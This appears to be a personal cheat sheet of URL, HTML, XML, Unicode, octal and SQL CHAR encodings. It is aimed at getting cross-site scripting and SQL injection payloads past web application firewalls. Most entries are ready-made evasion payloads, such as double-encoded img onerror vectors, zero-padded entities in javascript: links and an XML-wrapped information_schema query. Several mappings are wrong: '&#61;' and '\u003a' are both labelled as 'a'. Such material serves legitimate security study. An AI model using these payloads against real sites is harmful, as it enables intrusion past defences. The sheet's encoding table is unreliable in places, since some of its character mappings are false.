Usefull list URL encodings / HTML encodings

BTW you can use any decoder for this, but sometimes having a sheet regarding it could help you to "memorize it" and feel more confortable once you face or use it.

----------------------------------------------------------------------------------------
SINGLE CHARACTERS

%20 {space} -- sometimes you can find + -- EXAMPLE Fish+Chips or Fish%20Chips
%26 {&]
%22 {"}
%3D {=}
%3C {<}
%3E {>}
%25 {%}

----------------------------------------------------------------------------------------
COMBO

%53%45%4C%45%43%54 {SELECT}

DOUBLE DECODE TO TRICK WAF (Web Application Firewall)
in case WAF decodes this once

<img src=x onerror=alert(1)> -> %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> %253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E (% is decoded with %25)

----------------------------------------------------------------------------------------
HTML ENCODING
When the browser renders the page, it will decode and execute the injected payload

EXAMPLE -> &#{}{};

&#61; {a} -> <img src=x onerror="alert(1)"> -> <img src=x onerror="&#61;lert(1)">


Fill the hex with zero to fool the WAFs if you are not able to inject

&#00000000000058; {:} -> <a href="javascript:alert(1)">Click me</a> -> <a href="javascript&#00000000000058;alert(1)">Click me</a>



~
----------------------------------------------------------------------------------------

XML encoding
Sometimes WAFs could block your attack try to obfuscate it through XML encoding

<stockCheck>
    <productId>
        123
    </productId>0x
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>

----------------------------------------------------------------------------------------
UNICODE encoding

\u003a {a}

ES6 -> \u{3a} or \u{0000000003a} (if you want to fool WAFs)
eval("\u0061lert(1)")

----------------------------------------------------------------------------------------

Octal escaping

\141 {a} -> eval("\141lert(1)")

----------------------------------------------------------------------------------------
MULTIPLE ENCODINGS

&bsol  {\} -> <a href="javascript:&bsol;u0061lert(1)">Click me</a> -> <a href="javascript:\u0061lert(1)">Click me</a> -> <a href="javascript:alert(1)">Click me</a>

SQL CHAR

CHAR(83) or CHAR(0x53) {S}

CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84) {SELECT}

~
